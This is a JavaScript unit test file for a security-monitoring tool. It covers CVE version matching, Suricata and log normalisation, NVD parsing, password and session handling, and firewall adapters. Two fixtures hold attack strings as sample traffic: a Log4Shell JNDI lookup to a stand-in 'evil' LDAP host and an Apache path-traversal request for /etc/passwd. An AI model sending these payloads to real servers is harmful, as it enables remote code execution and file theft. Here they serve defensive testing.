'use strict';
// Unit tests for the pieces that touch real-world data formats.
const assert = require('assert');
const { exposureFor, compareVersions, isInternal } = require('../src/engine/analysis');
const { normalizeAlert, normalizeLog, normalizeAsset, parseCsv } = require('../src/ingest/normalize');
const { normalizeNvd } = require('../src/intel/nvd');
const auth = require('../src/security/auth');
const { WebhookAdapter, CloudflareAdapter } = require('../src/enforce');
const seed = require('../src/seed');

let n = 0;
const tests = [];
const test = (name, fn) => tests.push([name, fn]);

const log4j = seed.cves.find((c) => c.cve_id === 'CVE-2021-44228');
const httpd = seed.cves.find((c) => c.cve_id === 'CVE-2021-41773');
const host = (pkgs, services = []) => ({ installed_packages: pkgs, running_services: services });

test('CPE ranges: log4j 2.14.1 exposed, 2.17.1 and 2.12.2 not', () => {
  assert.ok(exposureFor(host(['log4j-core-2.14.1.jar']), log4j).exposed);
  assert.ok(!exposureFor(host(['log4j-core-2.17.1.jar']), log4j).exposed);
  assert.ok(!exposureFor(host(['log4j-core-2.12.2.jar']), log4j).exposed);
});

test('CPE exact version: httpd 2.4.49 exposed, 2.4.51 not', () => {
  assert.ok(exposureFor(host([], [{ port: 80, service: 'Apache httpd 2.4.49 (PHP 7.4.3)' }]), httpd).exposed);
  assert.ok(exposureFor(host(['httpd-2.4.49']), httpd).exposed);
  assert.ok(!exposureFor(host(['httpd-2.4.51']), httpd).exposed);
});

test('version compare', () => {
  assert.strictEqual(compareVersions('2.4.49', '2.4.5'), 1);
  assert.strictEqual(compareVersions('9.6p1', '9.6'), 1);
  assert.strictEqual(compareVersions('1.0', '1.0.0'), 0);
});

test('internal ranges', () => {
  for (const ip of ['10.1.2.3', '172.16.0.1', '192.168.1.1', '100.64.0.1', '127.0.0.1', 'fd00::1', 'fe80::1']) assert.ok(isInternal(ip), ip);
  for (const ip of ['8.8.8.8', '172.32.0.1', '2001:4860::8888']) assert.ok(!isInternal(ip), ip);
});

test('Suricata EVE alert normalises with stable id', () => {
  const eve = {
    timestamp: '2026-10-16T09:12:44.123456+0000', flow_id: 1234567, in_iface: 'eth0', event_type: 'alert',
    src_ip: '185.220.101.45', src_port: 51515, dest_ip: '10.0.4.15', dest_port: 8080, proto: 'TCP', app_proto: 'http',
    alert: { action: 'allowed', gid: 1, signature_id: 2034647, rev: 3, signature: 'ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)', category: 'Attempted Administrator Privilege Gain', severity: 1 },
    http: { hostname: 'shop.example', url: '/?x=${jndi:ldap://evil/a}', http_user_agent: 'curl/8', http_method: 'GET', protocol: 'HTTP/1.1' }
  };
  const a = normalizeAlert(eve).alert;
  assert.strictEqual(a.severity, 'CRITICAL');
  assert.strictEqual(a.external_ref, 'sid:2034647:3');
  assert.strictEqual(a.protocol, 'TCP/HTTP');
  assert.ok(a.raw_payload.includes('jndi:ldap'));
  assert.strictEqual(a.detected_at, '2026-10-16T09:12:44.123Z');
  assert.strictEqual(normalizeAlert(eve).alert.alert_id, a.alert_id);
  assert.ok(normalizeAlert({ event_type: 'flow' }).skip);
  assert.ok(normalizeAlert({ signature: 'Something odd', source_ip: 'nope', dest_ip: '10.0.0.1' }).error);
});

test('log lines: combined format and sshd', () => {
  const l = normalizeLog('203.0.113.9 - - [16/Oct/2026:09:12:44 +0000] "GET /cgi-bin/.%2e/etc/passwd HTTP/1.1" 200 1234', { host_ip: '10.0.4.88' }).log;
  assert.strictEqual(l.log_type, 'http_access');
  assert.strictEqual(l.client_ip, '203.0.113.9');
  assert.strictEqual(l.status_code, 200);
  const s = normalizeLog({ host_ip: '10.0.4.102', raw_entry: 'sshd[1]: Failed password for root from 45.95.147.236 port 4 ssh2' }).log;
  assert.strictEqual(s.log_type, 'auth_log');
  assert.strictEqual(s.client_ip, '45.95.147.236');
  assert.ok(normalizeLog('x', {}).error);
});

test('CSV asset import', () => {
  const rows = parseCsv('ip_address,hostname,criticality,services,installed_packages\r\n10.9.0.5,"web, edge",high,"443/nginx 1.22.1; 22/OpenSSH 9.6p1","log4j-core-2.14.1.jar;httpd-2.4.49"\n');
  assert.strictEqual(rows.length, 1);
  const a = normalizeAsset(rows[0]).asset;
  assert.strictEqual(a.hostname, 'web, edge');
  assert.strictEqual(a.criticality, 'HIGH');
  assert.deepStrictEqual(a.running_services, [{ port: 443, service: 'nginx 1.22.1' }, { port: 22, service: 'OpenSSH 9.6p1' }]);
  assert.ok(exposureFor(a, log4j).exposed);
  assert.ok(normalizeAsset({ ip_address: '10.0.0.1' }).error);
});

test('NVD record normalisation', () => {
  const rec = normalizeNvd({
    id: 'CVE-2024-3400', published: '2024-04-12T08:15:06.230', lastModified: '2024-04-20T01:00:00.000',
    cisaExploitAdd: '2024-04-12', cisaRequiredAction: 'Apply mitigations per vendor instructions.',
    descriptions: [{ lang: 'en', value: 'A command injection vulnerability in GlobalProtect. More text.' }],
    metrics: { cvssMetricV31: [{ type: 'Primary', cvssData: { version: '3.1', baseScore: 10, baseSeverity: 'CRITICAL', vectorString: 'CVSS:3.1/AV:N', attackVector: 'NETWORK', attackComplexity: 'LOW' } }] },
    configurations: [{ nodes: [{ cpeMatch: [{ vulnerable: true, criteria: 'cpe:2.3:o:paloaltonetworks:pan-os:*:*:*:*:*:*:*:*', versionStartIncluding: '11.1.0', versionEndExcluding: '11.1.2' }] }] }]
  });
  assert.strictEqual(rec.cvss_score, 10);
  assert.strictEqual(rec.kev, true);
  assert.strictEqual(rec.cpe_matches.length, 1);
  assert.strictEqual(rec.published, '2024-04-12T08:15:06.230Z');
  assert.ok(exposureFor(host([], [{ port: 443, service: 'PAN-OS 11.1.1' }]), rec).exposed);
});

test('passwords and sessions', () => {
  const h = auth.hashPassword('correct horse 1');
  assert.ok(auth.verifyPassword('correct horse 1', h));
  assert.ok(!auth.verifyPassword('correct horse 2', h));
  assert.ok(auth.passwordProblem('short1'));
  assert.ok(auth.passwordProblem('longbutnodigits'));
  assert.strictEqual(auth.passwordProblem('longenough9'), null);
  const tok = auth.signSession('s'.repeat(40), { id: 7, session_version: 3 });
  assert.deepStrictEqual((({ uid, v }) => ({ uid, v }))(auth.readSession('s'.repeat(40), tok)), { uid: 7, v: 3 });
  assert.strictEqual(auth.readSession('t'.repeat(40), tok), null);
  assert.strictEqual(auth.readSession('s'.repeat(40), tok.slice(0, -2) + 'xx'), null);
  const k = auth.generateApiKey();
  assert.ok(k.raw.startsWith('aeg_') && k.hash === auth.hashApiKey(k.raw) && k.raw.startsWith(k.prefix));
});

test('webhook adapter signs body and maps status', async () => {
  const crypto = require('crypto');
  let seen;
  const fetchImpl = async (url, opts) => { seen = opts; return { ok: true, status: 200, json: async () => ({ status: 'ok', id: 'r-1' }) }; };
  const w = new WebhookAdapter({ url: 'https://fw.example/hook', secret: 'hush', fetchImpl });
  const e = await w.apply({ rule_id: 'FW-1', action: 'BLOCK', target_ip: '203.0.113.9', reason: 'test' });
  assert.strictEqual(e.status, 'ENFORCED');
  assert.strictEqual(e.remote_id, 'r-1');
  const want = crypto.createHmac('sha256', 'hush').update(`${seen.headers['X-Aegis-Timestamp']}.${seen.body}`).digest('hex');
  assert.strictEqual(seen.headers['X-Aegis-Signature'], `sha256=${want}`);
  const down = new WebhookAdapter({ url: 'https://fw.example/hook', fetchImpl: async () => { throw new Error('ECONNREFUSED'); } });
  assert.strictEqual((await down.apply({ rule_id: 'FW-2', action: 'BLOCK', target_ip: '203.0.113.9' })).status, 'FAILED');
});

test('cloudflare adapter creates, verifies and removes', async () => {
  const calls = [];
  const fetchImpl = async (url, opts) => {
    calls.push(`${opts.method} ${url.split('/rules')[1] || '/'}`);
    if (opts.method === 'POST') return { ok: true, status: 200, json: async () => ({ success: true, result: { id: 'cf1' } }) };
    if (opts.method === 'GET') return { ok: true, status: 200, json: async () => ({ success: true, result: { id: 'cf1', mode: 'block', configuration: { value: '203.0.113.9' } } }) };
    return { ok: true, status: 200, json: async () => ({ success: true, result: { id: 'cf1' } }) };
  };
  const cf = new CloudflareAdapter({ token: 't', zoneId: 'zone123456', fetchImpl });
  const rule = { rule_id: 'FW-1', action: 'BLOCK', target_ip: '203.0.113.9', reason: 'x' };
  rule.enforcement = await cf.apply(rule);
  assert.strictEqual(rule.enforcement.status, 'ENFORCED');
  assert.strictEqual((await cf.verify(rule)).status, 'ENFORCED');
  assert.strictEqual((await cf.remove(rule)).status, 'REMOVED');
  assert.strictEqual((await cf.apply({ ...rule, action: 'ISOLATE' })).status, 'RECORDED');
  assert.deepStrictEqual(calls, ['POST ', 'GET /cf1', 'DELETE /cf1'].map((s) => s.replace('POST ', 'POST /')));
});

(async () => {
  let failed = 0;
  for (const [name, fn] of tests) {
    try { await fn(); n++; console.log(`PASS ${name}`); } catch (err) { failed++; console.log(`FAIL ${name}\n  ${err.stack.split('\n').slice(0, 3).join('\n  ')}`); }
  }
  console.log(`\n${n}/${tests.length} unit tests passed`);
  process.exit(failed ? 1 : 0);
})();